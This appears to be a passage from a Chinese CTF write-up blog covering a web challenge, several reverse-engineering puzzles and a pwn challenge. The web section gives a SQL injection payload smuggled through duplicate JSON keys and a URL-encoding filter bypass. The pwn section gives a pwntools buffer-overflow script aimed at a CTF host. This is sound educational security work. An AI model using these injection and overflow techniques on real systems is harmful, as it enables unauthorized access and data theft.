token&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">		data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="type">string</span>(data)))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路由 <code>/flag</code> 中GET两个参数 <code>?action=readFlag&amp;token=xxxxx</code>，token正确得flag，而路由 <code>/search</code> 中容易通过SQL注入拿到token。</p><p>python服务中 <code>app.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listAll</span>():</span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/list&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/healthcheck&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">healthCheck</span>():</span><br><span class="line">    getPath = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    postPath = [<span class="string">&quot;api/list&quot;</span>, <span class="string">&quot;api/search&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> getPath:</span><br><span class="line">            requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> postPath:</span><br><span class="line">            requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Down&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>发现其中存在两个点需要绕过：</p><ol><li>路由 <code>/search</code> 中JSON严格过滤，<code>name</code> 的值必须满足 <code>isalnum()</code>，<code>votes</code> 的值必须为数字，避免SQL注入情况；</li><li>检测url里使用GET方法传入 <code>action=readFlag</code> 会直接拒绝。</li></ol><p>对于第1点，尝试构造含两个 <code>name</code> 参数的JSON，在python中认JSON中第二个 <code>name</code>，而go中认JSON中第一个 <code>name</code>，利用这种差异构造：<code>&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;</code>，绕过得到token值，得到 <code>re@l1y_4th_T0k3n</code>。</p><p>对于第2点，利用 <code>@app.route(&quot;/&lt;path:path&gt;&quot;)</code> 特性，对 <code>?</code> 进行url编码可以在python层面绕过GET参数识别，即 <code>action = request.args.get(&#39;action&#39;)</code> 不会获取到内容，payload：<code>/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3n</code>。</p><p>得到flag：<code>&quot;&#123;\&quot;msg\&quot;:\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\n\&quot;&#125;\n&quot;</code></p><p>​</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="hiahia-o-▽-┛"><a href="#hiahia-o-▽-┛" class="headerlink" title="hiahia o(*^▽^*)┛"></a>hiahia o(*^▽^*)┛</h3><p>IDA查看伪码，无逆向，照着实现就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">list</span>(<span class="string">b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">c,k</span>):</span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">11</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">13</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">5</span></span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t+=<span class="built_in">chr</span>(flag(s[i],i))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># flag&#123;RrrrEe33202111&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h3><p>jadx查看MainActivity主逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">trim</span> <span class="operator">=</span> <span class="built_in">this</span>.input.getText().toString().trim();</span><br><span class="line">	<span class="type">int</span>[] iArr = &#123;<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>&#125;;</span><br><span class="line">	<span class="type">int</span>[] iArr2 = &#123;<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>&#125;;</span><br><span class="line">	<span class="keyword">if</span> (trim.length() != <span class="number">18</span>) &#123;</span><br><span class="line">		<span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAG错误&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span>[] charArray = trim.toCharArray();</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">		iArr2[i] = i % <span class="number">2</span> == <span class="number">0</span> ? charArray[i] ^ i : charArray[i] ^ charArray[i + <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">18</span>; i2++) &#123;</span><br><span class="line">		str = str.concat(Integer.toHexString(iArr2[i2])).concat(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	System.out.println(str);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>; i3 &lt; <span class="number">18</span>; i3++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (iArr2[i3] != iArr[i3]) &#123;</span><br><span class="line">			<span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAG错误！&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAG正确&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=[BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">7</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">out=[<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>]</span><br><span class="line"></span><br><span class="line">s=[<span class="number">42</span>]*<span class="number">19</span></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        s[i]=flag[i]^i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s[i]=flag[i]^flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    ss.add(s[i]==out[i])</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    res+=(<span class="built_in">chr</span>(m[flag[i]].as_long()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># flag&#123;Reverse__APP</span></span><br></pre></td></tr></table></figure><p>加花括号闭合，得到flag：flag{Reverse__APP}</p><p>​</p><h3 id="WAY"><a href="#WAY" class="headerlink" title="WAY"></a>WAY</h3><blockquote><p>flag{md5(result)}</p></blockquote><p>检测带upx壳，脱壳后IDA查看伪码，迷宫题，wsad代表上下左右，提取迷宫数组得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OIIII</span><br><span class="line">OOIO#</span><br><span class="line">IOOOI</span><br><span class="line">IOIOI</span><br><span class="line">IIIII</span><br></pre></td></tr></table></figure><p>容易得到路径：sdsddwd，MD5得到flag：flag{6654b3343f6f3f6223a721e7f65e87f8}</p><p>​</p><h3 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h3><p>Sparc架构，IDA无法反编译为伪码，用Ghidra得到伪码主逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  longlong unaff_g7;</span><br><span class="line">  <span class="type">int</span> local_res7d3;</span><br><span class="line">  undefined8 local_res7d7;</span><br><span class="line">  undefined8 local_res7df;</span><br><span class="line">  undefined8 local_res7e7;</span><br><span class="line">  undefined8 local_res7ef;</span><br><span class="line">  longlong local_res7f7;</span><br><span class="line">  </span><br><span class="line">  local_res7f7 = *(longlong *)(unaff_g7 + <span class="number">0x28</span>);</span><br><span class="line">  local_res7d7 = <span class="number">0</span>;</span><br><span class="line">  local_res7df = <span class="number">0</span>;</span><br><span class="line">  local_res7e7 = <span class="number">0x37463f3044413243</span>;</span><br><span class="line">  local_res7ef = <span class="number">0x3429000000000000</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input_sparkle_flag_here:\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,&amp;local_res7d7,<span class="number">0xc</span>);</span><br><span class="line">  local_res7d3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> &lt; local_res7d3) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good_job!&quot;</span>);</span><br><span class="line">LAB_001008a0:</span><br><span class="line">      <span class="keyword">if</span> (local_res7f7 == *(longlong *)(unaff_g7 + <span class="number">0x28</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      __stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) =</span><br><span class="line">         *(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + <span class="number">-0x2f</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) !=</span><br><span class="line">        *(<span class="type">char</span> *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;incorrect\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_001008a0;</span><br><span class="line">    &#125;</span><br><span class="line">    local_res7d3 = local_res7d3 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑为输入flag值逐字符 <code>-0x2f</code> 得到的字符串与 <code>0x37463f30444132433429</code> 相等，即ROT47。</p><p>简单还原得flag：flag{fun_sparcX}</p><p>​</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Ez-pwn"><a href="#Ez-pwn" class="headerlink" title="Ez_pwn"></a>Ez_pwn</h3><p>简单ret2text：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;hsc2019.site&#x27;</span>,<span class="number">10891</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x400741</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" title="Dest0g3 520迎新赛"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/" title="长安“战疫”网络安全卫士守护赛"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var 